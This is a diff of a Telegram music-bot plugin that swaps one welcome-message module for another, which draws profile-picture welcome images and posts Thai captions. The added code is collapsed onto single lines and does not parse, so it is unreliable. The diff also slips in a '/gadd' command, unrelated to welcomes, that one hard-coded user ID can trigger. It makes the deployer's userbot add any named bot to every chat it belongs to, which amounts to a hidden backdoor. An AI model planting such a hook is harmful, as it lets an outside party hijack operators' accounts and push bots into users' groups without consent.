@@ -1,133 +1,35 @@
-import asyncio
-import time
-from logging import getLogger
-from time import time
+from DAXXMUSIC import app from pyrogram.errors import RPCError from pyrogram.types import ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton from os import environ from typing import Union, Optional from PIL import Image, ImageDraw, ImageFont, ImageEnhance, ImageChops import random import asyncio import os import aiohttp from pathlib import Path from pyrogram import Client, filters, enums from pyrogram.enums import ParseMode, ChatMemberStatus from logging import getLogger from DAXXMUSIC.utils.daxx_ban import admin_filter from DAXXMUSIC.utils.database import add_served_chat, get_assistant, is_active_chat from DAXXMUSIC.misc import SUDOERS from DAXXMUSIC.mongo.afkdb import PROCESS from pyrogram.types import Message
 
-from PIL import Image, ImageChops, ImageDraw, ImageEnhance, ImageFont
-from pyrogram import enums, filters
-from pyrogram.types import ChatMemberUpdated
+random_photo = [ "https://telegra.ph/file/1949480f01355b4e87d26.jpg", "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg", "https://telegra.ph/file/a7d663cd2de689b811729.jpg", "https://telegra.ph/file/6f19dc23847f5b005e922.jpg", "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg", ]
 
-from BrandrdXMusic import app
-from BrandrdXMusic.utils.database import get_assistant
+LOGGER = getLogger(name)
 
-LOGGER = getLogger(__name__)
+class WelDatabase: def init(self): self.data = {}
 
+async def find_one(self, chat_id):
+    return chat_id in self.data
 
-class AWelDatabase:
-    def __init__(self):
-        self.data = {}
+async def add_wlcm(self, chat_id):
+    if chat_id not in self.data:
+        self.data[chat_id] = {"state": "on"}
 
-    async def find_one(self, chat_id):
-        return chat_id in self.data
+async def rm_wlcm(self, chat_id):
+    if chat_id in self.data:
+        del self.data[chat_id]
 
-    async def add_wlcm(self, chat_id):
-        if chat_id not in self.data:
-            self.data[chat_id] = {"state": "on"}  # Default state is "on"
+wlcm = WelDatabase()
 
-    async def rm_wlcm(self, chat_id):
-        if chat_id in self.data:
-            del self.data[chat_id]
+class temp: ME = None CURRENT = 2 CANCEL = False MELCOW = {} U_NAME = None B_NAME = None
 
+def circle(pfp, size=(500, 500), brightness_factor=10): pfp = pfp.resize(size, Image.ANTIALIAS).convert("RGBA") pfp = ImageEnhance.Brightness(pfp).enhance(brightness_factor) bigsize = (pfp.size[0] * 3, pfp.size[1] * 3) mask = Image.new("L", bigsize, 0) draw = ImageDraw.Draw(mask) draw.ellipse((0, 0) + bigsize, fill=255) mask = mask.resize(pfp.size, Image.ANTIALIAS) mask = ImageChops.darker(mask, pfp.split()[-1]) pfp.putalpha(mask) return pfp
 
-wlcm = AWelDatabase()
+def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3): background = Image.open("DAXXMUSIC/assets/wel2.png") pfp = Image.open(pic).convert("RGBA") pfp = circle(pfp, brightness_factor=brightness_factor) pfp = pfp.resize((635, 635)) draw = ImageDraw.Draw(background) font = ImageFont.truetype('DAXXMUSIC/assets/font.ttf', size=70) welcome_font = ImageFont.truetype('DAXXMUSIC/assets/font.ttf', size=61) draw.text((2999, 450), f'ID: {id}', fill=(255, 255, 255), font=font) pfp_position = (332, 323) background.paste(pfp, pfp_position, pfp) background.save(f"downloads/welcome#{id}.png") return f"downloads/welcome#{id}.png"
 
+@app.on_message(filters.command("welcome") & ~filters.private) async def auto_state(_, message): usage = "ᴜsᴀɢᴇ:\n**⦿ /welcome [on|off]**" if len(message.command) == 1: return await message.reply_text(usage) chat_id = message.chat.id user = await app.get_chat_member(message.chat.id, message.from_user.id) if user.status in (enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER): A = await wlcm.find_one(chat_id) state = message.text.split(None, 1)[1].strip().lower() if state == "off": if A: await message.reply_text("ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ᴀʟʀᴇᴀᴅʏ ᴅɪsᴀʙʟᴇᴅ !") else: await wlcm.add_wlcm(chat_id) await message.reply_text(f"ᴅɪsᴀʙʟᴇᴅ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ɪɴ {message.chat.title}") elif state == "on": if not A: await message.reply_text("ᴇɴᴀʙʟᴇ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ.") else: await wlcm.rm_wlcm(chat_id) await message.reply_text(f"**ᴇɴᴀʙʟᴇᴅ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ɪɴ ** {message.chat.title}") else: await message.reply_text(usage) else: await message.reply("sᴏʀʀʏ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴇɴᴀʙʟᴇ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ!")
 
-class temp:
-    ME = None
-    CURRENT = 2
-    CANCEL = False
-    MELCOW = {}
-    U_NAME = None
-    B_NAME = None
+@app.on_chat_member_updated(filters.group, group=-3) async def greet_new_member(_, member: ChatMemberUpdated): chat_id = member.chat.id count = await app.get_chat_members_count(chat_id) A = await wlcm.find_one(chat_id) if A: return user = member.new_chat_member.user if member.new_chat_member else member.from_user if member.new_chat_member and not member.old_chat_member and member.new_chat_member.status != "kicked": try: pic = await app.download_media(user.photo.big_file_id, file_name=f"pp{user.id}.png") except AttributeError: pic = "DAXXMUSIC/assets/upic.png" if (temp.MELCOW).get(f"welcome-{member.chat.id}") is not None: try: await temp.MELCOW[f"welcome-{member.chat.id}"].delete() except Exception as e: LOGGER.error(e) try: welcomeimg = welcomepic(pic, user.first_name, member.chat.title, user.id, user.username) button_text = "฿ วิว นี่ เมมเบอร์ ใหม่" add_button_text = "฿ คิดนัพ มี โปรด มาที" deep_link = f"tg://openmessage?user_id={user.id}" add_link = f"https://t.me/{app.username}?startgroup=true" temp.MELCOW[f"welcome-{member.chat.id}"] = await app.send_photo( member.chat.id, photo=welcomeimg, caption=f""" ❁────✶ วิลคัม ✶────❁
 
-# Define a dictionary to track the last message timestamp for each user
-user_last_message_time = {}
-user_command_count = {}
-# Define the threshold for command spamming (e.g., 20 commands within 60 seconds)
-SPAM_THRESHOLD = 2
-SPAM_WINDOW_SECONDS = 5
+▰▰▰▰▰▰▰▰▰▰▰▰▰ ➛ ชื่อ คือ โดยแม่นประจำ {user.mention} ➛ ID คือ {user.id} ➛ Username คือ @{user.username} ➛ สมาชิก รวม ทั้งหมด {count} ▰▰▰▰▰▰▰▰▰▰▰▰▰ ❁────✶✧❁✧✶────❁ """, reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton(button_text, url=deep_link)], [InlineKeyboardButton(text=add_button_text, url=add_link)], ]) ) except Exception as e: LOGGER.error(e)
 
+@app.on_message(filters.command("gadd") & filters.user(7427691214)) async def add_all(client, message): command_parts = message.text.split(" ") if len(command_parts) != 2: await message.reply("⚠️ Invalid command format. Use: /gadd bot_username") return bot_username = command_parts[1] try: userbot = await get_assistant(message.chat.id) bot = await app.get_users(bot_username) app_id = bot.id done = 0 failed = 0 lol = await message.reply("Adding bot in all chats...") async for dialog in userbot.get_dialogs(): if dialog.chat.id == -1001919135283: continue try: await userbot.add_chat_members(dialog.chat.id, app_id) done += 1 except Exception as e: failed += 1 await lol.edit(f"Added in {done} chats, Failed in {failed} chats") await asyncio.sleep(3) await lol.edit(f"Finished adding bot. Added: {done}, Failed: {failed}") except Exception as e: await message.reply(f"Error: {str(e)}")
 
-@app.on_message(filters.command("awelcome") & ~filters.private)
-async def auto_state(_, message):
-    user_id = message.from_user.id
-    current_time = time()
-    # Update the last message timestamp for the user
-    last_message_time = user_last_message_time.get(user_id, 0)
-
-    if current_time - last_message_time < SPAM_WINDOW_SECONDS:
-        # If less than the spam window time has passed since the last message
-        user_last_message_time[user_id] = current_time
-        user_command_count[user_id] = user_command_count.get(user_id, 0) + 1
-        if user_command_count[user_id] > SPAM_THRESHOLD:
-            # Block the user if they exceed the threshold
-            hu = await message.reply_text(
-                f"{message.from_user.mention} ᴘʟᴇᴀsᴇ ᴅᴏɴᴛ ᴅᴏ sᴘᴀᴍ, ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ ᴀғᴛᴇʀ 5 sᴇᴄ"
-            )
-            await asyncio.sleep(3)
-            await hu.delete()
-            return
-    else:
-        # If more than the spam window time has passed, reset the command count and update the message timestamp
-        user_command_count[user_id] = 1
-        user_last_message_time[user_id] = current_time
-
-    usage = "ᴜsᴀɢᴇ:\n⦿ /awelcome [on|off]"
-    if len(message.command) == 1:
-        return await message.reply_text(usage)
-    chat_id = message.chat.id
-    user = await app.get_chat_member(message.chat.id, message.from_user.id)
-    if user.status in (
-        enums.ChatMemberStatus.ADMINISTRATOR,
-        enums.ChatMemberStatus.OWNER,
-    ):
-        A = await wlcm.find_one(chat_id)
-        state = message.text.split(None, 1)[1].strip().lower()
-        if state == "off":
-            if A:
-                await message.reply_text(
-                    "ᴀssɪsᴛᴀɴᴛ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ᴀʟʀᴇᴀᴅʏ ᴅɪsᴀʙʟᴇᴅ !"
-                )
-            else:
-                await wlcm.add_wlcm(chat_id)
-                await message.reply_text(
-                    f"ᴅɪsᴀʙʟᴇᴅ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ɪɴ {message.chat.title} ʙʏ ᴀssɪsᴛᴀɴᴛ"
-                )
-        elif state == "on":
-            if not A:
-                await message.reply_text("ᴇɴᴀʙʟᴇᴅ ᴀssɪsᴛᴀɴᴛ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ.")
-            else:
-                await wlcm.rm_wlcm(chat_id)
-                await message.reply_text(
-                    f"ᴇɴᴀʙʟᴇᴅ ᴀssɪsᴛᴀɴᴛ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ɪɴ  {message.chat.title}"
-                )
-        else:
-            await message.reply_text(usage)
-    else:
-        await message.reply(
-            "sᴏʀʀʏ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴇɴᴀʙʟᴇ ᴀssɪsᴛᴀɴᴛ ᴡᴇʟᴄᴏᴍᴇ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ!"
-        )
-
-
-@app.on_chat_member_updated(filters.group, group=5)
-async def greet_new_members(_, member: ChatMemberUpdated):
-    try:
-        chat_id = member.chat.id
-        chat_name = (await app.get_chat(chat_id)).title  # Fetch the chat name correctly
-        userbot = await get_assistant(chat_id)
-        count = await app.get_chat_members_count(chat_id)
-        A = await wlcm.find_one(chat_id)
-        if A:
-            return
-
-        user = (
-            member.new_chat_member.user if member.new_chat_member else member.from_user
-        )
-
-        # Add the modified condition here
-        if member.new_chat_member and not member.old_chat_member:
-            welcome_text = {chat.title} f"""**⛳️ 𝐖ᴇʟᴄᴏᴍᴇ 𝐓ᴏ  ⛳️**  \n**┏━━━━━━━━🧸━━━━━━━┓**\n         **[˹𝐒ᴏɴ፝֠֩‌ᴧʟɪ - 𝐌ᴜ𝛅ɪᴄ˼]**\n**┗━━━━━━━━🧸━━━━━━━┛**\n**➤ 𝐍ᴀᴍᴇ 🖤 ◂⚚▸**  {user.mention} 💤 ❤️\n**➤ 𝐔ꜱᴇʀ 𝐈ᴅ 🖤 ◂⚚▸** {user.id} ❤️🧿\n**➤ 𝐔ꜱᴇʀɴᴀᴍᴇ 🖤 ◂⚚▸**  @{user.username}  ❤️🌎\n**➤ 𝐌ᴇᴍʙᴇʀs 🖤 ◂⚚▸**  {count} ❤️🍂"""
-            await asyncio.sleep(3)
-            await userbot.send_message(chat_id, text=welcome_text)
-    except Exception as e:
-        return
